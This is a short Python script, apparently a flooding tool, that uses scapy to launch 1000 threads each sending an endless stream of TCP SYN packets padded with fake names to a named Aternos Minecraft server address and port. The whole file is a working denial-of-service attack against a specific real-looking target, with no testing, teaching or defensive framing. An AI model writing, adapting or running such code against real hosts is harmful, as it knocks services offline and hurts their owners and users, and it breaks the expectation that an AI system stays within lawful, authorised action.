import threading
from scapy.all import *
import random
from faker import Faker
import time


target_ip = "FronzCraftS3.aternos.me"
target_port = 25992

fake = Faker()


def attack():
    while True:

        fake_name = fake.name()


        ip = IP(dst=target_ip)
        tcp = TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")

        
        payload = fake_name.encode() * 5  
        
        
        packet = ip / tcp / payload
        
        
        send(packet, verbose=False)

        
        time.sleep(0.01)  


for i in range(1000):  
    thread = threading.Thread(target=attack)
    thread.start()